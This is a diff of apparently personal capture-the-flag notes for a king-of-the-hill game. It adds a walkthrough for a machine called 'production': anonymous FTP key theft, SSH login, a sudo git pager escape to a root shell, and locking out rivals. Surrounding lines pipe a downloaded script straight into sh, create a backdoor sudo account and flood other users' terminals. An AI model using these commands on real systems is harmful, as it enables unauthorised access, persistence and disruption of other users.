@@ -5,7 +5,8 @@ find all admin commands:
 `find / -perm -u=s -type f 2>/dev/null`  
 run linPEAS.sh(tool that finds potential privilege escalation points)  
 `curl https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS | sh`  
-
+find sudo commands
+`sudo -l`
 # notable places:  
 /dev/urandom - infinite stream of random characters(usually whitespace and non-ascii)  
 /dev/zero - infinite stream of zeroes  
@@ -82,14 +83,26 @@ change password
 ???  
 profit      
 
-
-
-
+## production:  
+navigate to `ftp://anonymous@<ip>:21`  
+download id_rsa and the flag, put the flag in  
+```
+chmod 600 id_rsa
+ssh -i id_rsa ashu@<ip>
+sudo su skidy
+sudo git -p help config
+!/bin/sh
+```
+you have root now, become king
+afterwards stuff
+```
+sudo chmod -sx /usr/lib/git-core/git
+```
 # afterwards stuff:  
 sudo useradd technoblade(i typically use password neverdie)  
 sudo usermod -aG sudo technoblade  
 echo "banana" > /dev/pts/<0 through 9>  
-cat /dev/urandom > /dev/pts/<everyone except you> &  
+cat /dev/urandom > /dev/pts/<everyone except you> & 
 use social engineering wall  
 
 ## social engineering wall:
